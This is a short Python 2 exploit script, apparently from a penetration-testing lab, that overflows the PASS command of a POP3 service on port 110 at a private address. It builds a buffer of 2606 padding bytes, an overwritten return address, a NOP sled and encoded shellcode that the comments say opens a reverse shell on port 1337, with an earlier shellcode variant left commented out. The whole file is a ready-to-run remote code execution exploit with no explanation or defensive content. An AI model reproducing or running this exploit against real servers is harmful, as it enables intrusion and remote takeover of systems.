#!/usr/bin/env python
import socket, sys

if __name__ == '__main__':

	# Reverse shell on port 1337

	#shellcode = ("\xbf\x9b\x8f\xc9\x34\xdb\xdc\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"
#"\x52\x31\x7a\x12\x83\xc2\x04\x03\xe1\x81\x2b\xc1\xe9\x76\x29"
#"\x2a\x11\x87\x4e\xa2\xf4\xb6\x4e\xd0\x7d\xe8\x7e\x92\xd3\x05"
#"\xf4\xf6\xc7\x9e\x78\xdf\xe8\x17\x36\x39\xc7\xa8\x6b\x79\x46"
#"\x2b\x76\xae\xa8\x12\xb9\xa3\xa9\x53\xa4\x4e\xfb\x0c\xa2\xfd"
#"\xeb\x39\xfe\x3d\x80\x72\xee\x45\x75\xc2\x11\x67\x28\x58\x48"
#"\xa7\xcb\x8d\xe0\xee\xd3\xd2\xcd\xb9\x68\x20\xb9\x3b\xb8\x78"
#"\x42\x97\x85\xb4\xb1\xe9\xc2\x73\x2a\x9c\x3a\x80\xd7\xa7\xf9"
#"\xfa\x03\x2d\x19\x5c\xc7\x95\xc5\x5c\x04\x43\x8e\x53\xe1\x07"
#"\xc8\x77\xf4\xc4\x63\x83\x7d\xeb\xa3\x05\xc5\xc8\x67\x4d\x9d"
#"\x71\x3e\x2b\x70\x8d\x20\x94\x2d\x2b\x2b\x39\x39\x46\x76\x56"
#"\x8e\x6b\x88\xa6\x98\xfc\xfb\x94\x07\x57\x93\x94\xc0\x71\x64"
#"\xda\xfa\xc6\xfa\x25\x05\x37\xd3\xe1\x51\x67\x4b\xc3\xd9\xec"
#"\x8b\xec\x0f\xa2\xdb\x42\xe0\x03\x8b\x22\x50\xec\xc1\xac\x8f"
#"\x0c\xea\x66\xb8\xa7\x11\xe1\xcd\x3c\x19\xc2\xb9\x40\x19\x21"
#"\x03\xcc\xff\x43\x63\x98\xa8\xfb\x1a\x81\x22\x9d\xe3\x1f\x4f"
#"\x9d\x68\xac\xb0\x50\x99\xd9\xa2\x05\x69\x94\x98\x80\x76\x02"
#"\xb4\x4f\xe4\xc9\x44\x19\x15\x46\x13\x4e\xeb\x9f\xf1\x62\x52"
#"\x36\xe7\x7e\x02\x71\xa3\xa4\xf7\x7c\x2a\x28\x43\x5b\x3c\xf4"
#"\x4c\xe7\x68\xa8\x1a\xb1\xc6\x0e\xf5\x73\xb0\xd8\xaa\xdd\x54"
#"\x9c\x80\xdd\x22\xa1\xcc\xab\xca\x10\xb9\xed\xf5\x9d\x2d\xfa"
#"\x8e\xc3\xcd\x05\x45\x40\xfd\x4f\xc7\xe1\x96\x09\x92\xb3\xfa"
#"\xa9\x49\xf7\x02\x2a\x7b\x88\xf0\x32\x0e\x8d\xbd\xf4\xe3\xff"
#"\xae\x90\x03\x53\xce\xb0")

	shellcode = ("\xbd\xf9\xf5\xca\x8e\xdb\xcd\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x52\x31\x68\x12\x83\xe8\xfc\x03\x91\xfb\x28\x7b\x9d\xec\x2f"
"\x84\x5d\xed\x4f\x0c\xb8\xdc\x4f\x6a\xc9\x4f\x60\xf8\x9f\x63"
"\x0b\xac\x0b\xf7\x79\x79\x3c\xb0\x34\x5f\x73\x41\x64\xa3\x12"
"\xc1\x77\xf0\xf4\xf8\xb7\x05\xf5\x3d\xa5\xe4\xa7\x96\xa1\x5b"
"\x57\x92\xfc\x67\xdc\xe8\x11\xe0\x01\xb8\x10\xc1\x94\xb2\x4a"
"\xc1\x17\x16\xe7\x48\x0f\x7b\xc2\x03\xa4\x4f\xb8\x95\x6c\x9e"
"\x41\x39\x51\x2e\xb0\x43\x96\x89\x2b\x36\xee\xe9\xd6\x41\x35"
"\x93\x0c\xc7\xad\x33\xc6\x7f\x09\xc5\x0b\x19\xda\xc9\xe0\x6d"
"\x84\xcd\xf7\xa2\xbf\xea\x7c\x45\x6f\x7b\xc6\x62\xab\x27\x9c"
"\x0b\xea\x8d\x73\x33\xec\x6d\x2b\x91\x67\x83\x38\xa8\x2a\xcc"
"\x8d\x81\xd4\x0c\x9a\x92\xa7\x3e\x05\x09\x2f\x73\xce\x97\xa8"
"\x74\xe5\x60\x26\x8b\x06\x91\x6f\x48\x52\xc1\x07\x79\xdb\x8a"
"\xd7\x86\x0e\x1c\x87\x28\xe1\xdd\x77\x89\x51\xb6\x9d\x06\x8d"
"\xa6\x9e\xcc\xa6\x4d\x65\x87\xc2\x9a\x65\x64\xbb\x9e\x65\x8f"
"\x02\x16\x83\xe5\x64\x7e\x1c\x92\x1d\xdb\xd6\x03\xe1\xf1\x93"
"\x04\x69\xf6\x64\xca\x9a\x73\x76\xbb\x6a\xce\x24\x6a\x74\xe4"
"\x40\xf0\xe7\x63\x90\x7f\x14\x3c\xc7\x28\xea\x35\x8d\xc4\x55"
"\xec\xb3\x14\x03\xd7\x77\xc3\xf0\xd6\x76\x86\x4d\xfd\x68\x5e"
"\x4d\xb9\xdc\x0e\x18\x17\x8a\xe8\xf2\xd9\x64\xa3\xa9\xb3\xe0"
"\x32\x82\x03\x76\x3b\xcf\xf5\x96\x8a\xa6\x43\xa9\x23\x2f\x44"
"\xd2\x59\xcf\xab\x09\xda\xef\x49\x9b\x17\x98\xd7\x4e\x9a\xc5"
"\xe7\xa5\xd9\xf3\x6b\x4f\xa2\x07\x73\x3a\xa7\x4c\x33\xd7\xd5"
"\xdd\xd6\xd7\x4a\xdd\xf2")

	# \x90 * 16 are NOPs | shellcode size 351 bytes
	buff = "A" * 2606 + "\x8f\x35\x4a\x5f" + "\x90" * 16 + shellcode + "C" * (3500-2606-4-351-16)

	try:
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock_conn = sock.connect(("10.11.21.97", 110))
		data = sock.recv(1024)
		print data
	
		sock.send("USER test\r\n")
		data = sock.recv(1024)
		print data

		sock.send("PASS {0}\r\n".format(buff))
		data = sock.recv(1024)
		print data
	except socket.error:
		print("[x] Unable to connect...")
	finally:
		sock.close()
		sys.exit(0)

